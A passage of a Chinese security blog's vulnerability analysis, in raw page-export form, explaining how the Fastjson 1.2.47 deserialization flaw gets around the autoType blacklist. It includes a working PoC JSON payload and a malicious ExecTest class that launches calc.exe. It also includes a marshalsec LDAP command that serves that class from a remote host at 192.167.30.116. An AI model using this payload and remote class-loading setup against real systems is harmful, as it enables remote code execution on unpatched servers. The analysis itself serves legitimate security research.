class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">    ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(contextClassLoader != <span class=\"keyword\">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class=\"line\">        clazz = contextClassLoader.loadClass(className);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cache) &#123;</span><br><span class=\"line\">            mappings.put(className, clazz);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在该代码段中，程序通过contextClassLoader.loadClass(className);方法从字符串类型className变量(“com.sun.rowset.JdbcRowSetImpl”)获取到com.sun.rowset.JdbcRowSetImpl类对象，并赋值给clazz变量。此时的className、clazz变量形式如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/f4935a82428a0c6642e7509665520283.png\"></p>\n<p>接着，程序判断cache变量情况：在当cache为true时，将className、clazz键值对加入mappings集合(cache默认为true)。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/841cfa794636ad9294c1c64afe0c1522.png\"></p>\n<p>经过动态调试可以发现，通过上面的一系列操作，Mappings集合中确实已经加入了我们的恶意类com.sun.rowset.JdbcRowSetImpl，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/627c0a9c95e6249cd96f15fcfb201c8c.png\"></p>\n<p>在我们的第一个json字符串解析完成后，程序随后会解析我们第二个json字符串</p>\n<h3 id=\"“b”-“-type”-”com-sun-rowset-JdbcRowSetImpl”-”dataSourceName”-”ldap-localhost-1389-ExecTest”-”autoCommit”-true-解析过程\"><a href=\"#“b”-“-type”-”com-sun-rowset-JdbcRowSetImpl”-”dataSourceName”-”ldap-localhost-1389-ExecTest”-”autoCommit”-true-解析过程\" class=\"headerlink\" title=\"“b”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://localhost:1389/ExecTest”,”autoCommit”:true}解析过程\"></a>“b”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://localhost:1389/ExecTest”,”autoCommit”:true}解析过程</h3><p>与第一个json字符串解析流程完全一致，程序也执行到下图部分</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/24ef953b36ad28dd753484d28f2a5ffb.png\"></p>\n<p>由于这次Mapping中有键名为com.sun.rowset.JdbcRowSetImpl的元素，因此clazz被赋值为com.sun.rowset.JdbcRowSetImpl类对象</p>\n<p>从下面两张图可见，此时上文的流程完全一致，只不过这次返回的时com.sun.rowset.JdbcRowSetImpl类对象</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/a680629fb9e9f50beaff134655281076.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/5918f6f889685868b8888d34093a5b47.png\"></p>\n<p>com.sun.rowset.JdbcRowSetImpl恶意类被顺利返回，但是整个操作流程中并未触发checkAutoType黑白名单校验机制。随后com.sun.rowset.JdbcRowSetImpl恶意类被反序列化，触发漏洞利用</p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>为了证实漏洞的存在，我们首先在192.167.30.116服务器的80端口web服务上部署ExecTest.class。ExecTest.java中内容如下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.Context;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.Name;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.spi.ObjectFactory;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Hashtable;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ExecTest</span> <span class=\"keyword\">implements</span> <span class=\"title\">ObjectFactory</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">getObjectInstance</span><span class=\"params\">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> </span>&#123;</span><br><span class=\"line\">        exec(<span class=\"string\">&quot;xterm&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">exec</span><span class=\"params\">(String cmd)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            Runtime.getRuntime().exec(<span class=\"string\">&quot;calc.exe&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        exec(<span class=\"string\">&quot;123&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>使用marshalsec开启ladp服务，监听在1389端口</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">java</span> -cp marshalsec-<span class=\"number\">0</span>.<span class=\"number\">0</span>.<span class=\"number\">3</span>-SNAPSHOT-<span class=\"literal\">all</span>.jar marshalsec.jndi.LDAPRefServer <span class=\"string\">&quot;http://192.167.30.116/java/#ExecTest&quot;</span> <span class=\"number\">1389</span></span><br></pre></td></tr></table></figure>\n\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/image-20200918145806799.png\" alt=\"image-20200918145806799\"></p>\n<p>demo程序执行完毕，计算器成功弹出</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/image-20200918145737798.png\" alt=\"image-20200918145737798\"></p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"","more":"<img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.jpg\" width=\"0\" height=\"0\" />\n\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>本文衔接上一篇文章《FastJson历史漏洞研究（一）》，继续探讨一下FastJson的历史漏洞。这次将要介绍的是Fastjson 1.2.47版本存漏洞成因以及其利用方式。</p>\n<h2 id=\"Fastjson-1-2-47漏洞分析\"><a href=\"#Fastjson-1-2-47漏洞分析\" class=\"headerlink\" title=\"Fastjson 1.2.47漏洞分析\"></a>Fastjson 1.2.47漏洞分析</h2><p>Fastjson 1.2.47版本漏洞与上篇文章中介绍的几处漏洞在原理上有着很大的不同。与Fastjson历史上存在的大多数漏洞不同的是，Fastjson 1.2.47版本的漏洞利用在AutoTypeSupport功能未开启时进行</p>\n<p>首先来看一下公开的poc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">demo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String payload = <span class=\"string\">&quot;&#123;\\&quot;a\\&quot;:&#123;\\&quot;@type\\&quot;:\\&quot;java.lang.Class\\&quot;,\\&quot;val\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;&#125;,&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;\\&quot;b\\&quot;:&#123;\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\&quot;dataSourceName\\&quot;:\\&quot;ldap://localhost:1389/ExecTest\\&quot;,\\&quot;autoCommit\\&quot;:true&#125;&#125;&quot;</span>;</span><br><span class=\"line\">        Object obj = JSON.parseObject(payload);</span><br><span class=\"line\">        System.out.println(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>从代码中可见，与以往利用不同的是，该poc中构造了两个json字符串</p>\n<p>1、”a”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”}</p>\n<p>2、”b”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://localhost:1389/ExecTest”,”autoCommit”:true}</p>\n<p>为了弄清楚这样构造的意义，我们来动态调试一下这个漏洞</p>\n<p>程序首先解析第一个json字符串</p>\n<h3 id=\"“a”-“-type”-”java-lang-Class”-”val”-”com-sun-rowset-JdbcRowSetImpl”-解析过程\"><a href=\"#“a”-“-type”-”java-lang-Class”-”val”-”com-sun-rowset-JdbcRowSetImpl”-解析过程\" class=\"headerlink\" title=\"“a”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”} 解析过程\"></a>“a”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”} 解析过程</h3><p>我们跳过部分FastJson解析流程，直接来看checkAutoType安全模块时的操作。对这个字符串中@type字段进行校验</p>\n<p>在位于com/alibaba/fastjson/parser/ParserConfig.java的checkAutoType安全模块中，程序首先进入了这个分支，程序调用getClassFromMapping对typeName进行解析，typeName即为字符串中@type的值，在第一个json字符串中，这个值为”java.lang.Class”</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2420aa3e444cd8831083d8d5b478abfc.png\"></p>\n<p>我们跟入位于com/alibaba/fastjson/util/TypeUtils.java 的getClassFromMapping</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1645767771638713c708e6ea1cccd750.png\"></p>\n<p>从上图代码可见，程序想从mappings中寻找键名为”java.lang.Class”的元素并返回对应的键值。值得一提的是，mappings集合与后文将要讲到的buckets集合对这个漏洞至关重要，这二者是这个漏洞产生的核心因素</p>\n<ul>\n<li>mappings集合</li>\n</ul>\n<p>mappings中存储的数据都是什么呢?经过调试可以发现其中数据形式如下图中所展示</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1946d987b45c01b2fb8ef2f301f33555.png\"></p>\n<p>从上图可见，mappings中存储着类名字符串以及对应类对象。然而mappings中的数据又是从何而来的呢？</p>\n<p>经过调试发现，mappings中存储的数据是由位于com/alibaba/fastjson/util/TypeUtils.java的addBaseClassMappings方法添加的</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/1c543ae7df2885e45fcfb221acbaec02.png\"></p>\n<p>从Mapping集合中的数据可以猜测，Mapping是用来存储一些基础的Class，以便于在反序列化处理这些基础类时提高效率</p>\n<p>在弄清楚mappings列表的由来后，继续回到正题。我们构造的typeName(@type指定的”java.lang.Class”)并不在Mappings的键中。因此getClassFromMapping方法返回null，程序继续向下执行进入下一个if分支。此时程序接着调用deserializers.findClass对传入的typeName进行解析</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/8dd7c917dd26e4b7b91f88e99b3f27b6.png\"></p>\n<p>我们跟入位于com/alibaba/fastjson/util/IdentityHashMap.java的findClass方法进行进一步分析</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2f2986a32d56d2b54865f4ebcb9d23f6.png\"></p>\n<p>从上图代码可见，程序会遍历buckets，取出其中元素的key属性值的名称并与传入的”java.lang.Class”进行比较，如果二者相同，则将这个Class对象返回</p>\n<ul>\n<li>buckets集合</li>\n</ul>\n<p>现在我们要谈谈buckets集合了。buckets又存储着什么元素呢？见下图</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/22563478e0b87b0d289cf35117c3231c.png\"></p>\n<p>上图我们展开了一个buckets集合中元素进行展示。与Mapping集合相同的问题产生了：buckets中的元素都有哪些、他们又从何而来呢？经过调试我们在见下三张图中找到了答案</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/8007c0112c7801da18f86ac3a75e8e6d.png\"></p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/412c0f522602bd8daf58abf8f69db50b.png\"></p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/e6b05a79b6d0f0fdadd4cc6d77a4a18a.png\"></p>\n<p>通过FastJson作者关于buckets集合的注释猜测，buckets是一个用于并发的IdentityHashMap</p>\n<p>回到调试流程中findClass方法来，我们构造的typeName(@type指定的”java.lang.Class”)被findClass方法匹配到了，因此java.lang.Class类对象被返回</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/82dd20226b88a73b0da0445e9f14e06b.png\"></p>\n<p>在findClass执行完成后，java.lang.Class类对象被返回到checkAutoType中并赋值给clazz，checkAutoType方法也将于963行处将clazz返回</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/46f06595b7368dd74198ee7d766d7b88.png\"></p>\n<p>回顾一下上文中的Mapping集合和buckets集合，Fastjson为什么要将用户传入的@type字段指定的字符串在这两个集合中匹配呢?</p>\n<p>Mapping集合则是用来存储基础的Class，如果@type字段传入的字符串如果对应了基础Class，程序则直接找到其类对象并将其类对象返回，从而跳过了checkAutoType后续的部分校验过程。而buckets集合则是用于并发操作。</p>\n<p>但无论Mapping集合与buckets集合实际作用是什么，但凡用户传入的@type字段字段值在两个集合中任意一个中，且程序使用JSON.parseObject(payload);这样的形式解析字符串(确保expectClass为空，防止进入上图957行if分支)，checkAutoType都将会直接将其对应的Class返回。</p>\n<p>checkAutoType在将clazz返回后，程序将会执行到com/alibaba/fastjson/parser/DefaultJSONParser.java中的如下代码</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/b533500e7b23d973fdbc5987b7dcbd46.png\"></p>\n<p>从上图第一个红框可见，checkAutoType在将用户传入的@type值返回后，程序会赋值给上图316行处clazz变量，而上图384行处的deserialze方法紧接着处理这个clazz变量</p>\n<p>跟入位于com/alibaba/fastjson/serializer/MiscCodec.java的deserialze方法中</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> &lt;T&gt; <span class=\"function\">T <span class=\"title\">deserialze</span><span class=\"params\">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> </span>&#123;</span><br><span class=\"line\">    JSONLexer lexer = parser.lexer;</span><br><span class=\"line\"></span><br><span class=\"line\">    ⋮</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!<span class=\"string\">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;syntax error&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            lexer.nextToken();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;syntax error&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        parser.accept(JSONToken.COLON);</span><br><span class=\"line\"></span><br><span class=\"line\">        objVal = parser.parse();</span><br><span class=\"line\"></span><br><span class=\"line\">        parser.accept(JSONToken.RBRACE);</span><br><span class=\"line\"></span><br><span class=\"line\">    ⋮</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (objVal == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        strVal = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (objVal <span class=\"keyword\">instanceof</span> String) &#123;</span><br><span class=\"line\">        strVal = (String) objVal;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    </span><br><span class=\"line\">    ⋮</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (clazz == Class.class) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>此时传入deserialze中clazz变量为checkAutoType安全模块校验后返回的”java.lang.Class”，而fieldName变量值为解析的第一个json字段名”a”</p>\n<p>接着来看deserialze方法，在deserialze中与本次漏洞与poc构造的代码块主要有三部分，分别是：</p>\n<ol>\n<li>取出json字符串中val值</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"string\">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;syntax error&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    lexer.nextToken();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;syntax error&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">parser.accept(JSONToken.COLON);</span><br><span class=\"line\"></span><br><span class=\"line\">objVal = parser.parse();</span><br><span class=\"line\"></span><br><span class=\"line\">parser.accept(JSONToken.RBRACE);</span><br></pre></td></tr></table></figure>\n\n<p>在这段代码中，程序将判断传入的json字符串中是否有”val”,并将其值通过下图第一个红框处的代码取出赋值给objVal变量。</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/47177876b55bd9044eddca76e26b86de.png\"></p>\n<ol start=\"2\">\n<li>将objVal变量值转换为String类型并赋值strVal变量</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (objVal == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">    strVal = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (objVal <span class=\"keyword\">instanceof</span> String) &#123;</span><br><span class=\"line\">    strVal = (String) objVal;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>这段代码与上一段衔接，objVal变量值又传递给下图第二个红框处。strVal变量判断objVal非空且为String类实例时，将其转换为String类型并赋值与strVal</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/886de67b224f656905c2ffb37cd22001.png\"></p>\n<ol start=\"3\">\n<li>调用TypeUtils.loadClass处理val值</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (clazz == Class.class) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这段代码的作用时，当传入的clazz变量为Class的类对象时，调用TypeUtils.loadClass处理strVal(即json字符串中的val值)</p>\n<p>在分析完deserialze方法的加工流程后，我们回头看看poc中构造的val值是什么，见下图红框处</p>\n<p><img src=\"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/088df0f5968737cfa586757403329393.png\"></p>\n<p>poc中构造的是com.sun.rowset.JdbcRowSetImpl字符串，也就是过往漏洞利用中可利用的类。但是根据之前的分析，自从黑名单机制的完善，这个类早已已经不能简单的直接利用了，这个漏洞究竟是如何让这个类绕过黑名单重获新生呢？我们继续往下看看TypeUtils.loadClass中的操作，继续跟入位于com/alibaba/fastjson/util/TypeUtils.java的loadClass</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class=\"keyword\">boolean</span> cache) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(className == <span class=\"keyword\">null</span> || className.length() == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(clazz != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(className.charAt(<span class=\"number\">0</span>) == <span class=\"string\">&#x27;[&#x27;</span>)&#123;</span><br><span class=\"line\">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class=\"number\">1</span>), classLoader);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Array.newInstance(componentType, <span class=\"number\">0</span>).getClass();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(className.startsWith(<span class=\"string\">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class=\"string\">&quot;;&quot;</span>))&#123;</span><br><span class=\"line\">        String newClassName = className.substring(<span class=\"number\">1</span>, className.length() - <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> loadClass(newClassName, classLoader);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(classLoader != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            clazz = classLoader.loadClass(className);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (cache) &#123;</span><br><span class=\"line\">                mappings.put(className, clazz);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span>(Throwable e)&#123;</span><br><span class=\"line\">        e.printStackTrace();</span><br><span class=\"line\">        <span class=\"comment\">// skip</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(contextClassLoader != <span class=\"keyword\">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class=\"line\">            clazz = contextClassLoader.loadClass(className);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (cache) &#123;</span><br><span class=\"line\">                mappings.put(className, clazz);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span>(Throwable e)&#123;</span><br><span class=\"line\">        <span class=\"comment\">// skip</span></span><br><span class=\"line\">    